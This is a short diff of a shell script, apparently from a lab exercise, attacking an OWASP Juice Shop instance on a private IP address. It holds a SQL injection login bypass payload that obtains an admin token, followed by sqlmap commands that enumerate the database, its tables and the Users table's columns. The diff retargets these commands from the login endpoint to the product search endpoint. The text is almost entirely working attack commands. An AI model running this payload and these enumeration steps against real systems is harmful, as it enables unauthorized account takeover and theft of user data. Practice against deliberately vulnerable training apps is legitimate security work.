@@ -293,19 +293,19 @@ TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
   -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}' | jq -r '.authentication.token')
 
 # Enumerate databases
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --level=5 --dbs --batch
 
 # Enumerate tables
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --level=5 --tables --batch
 
 # Enumerate columns for Users table
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --level=5 -T Users --columns --batch
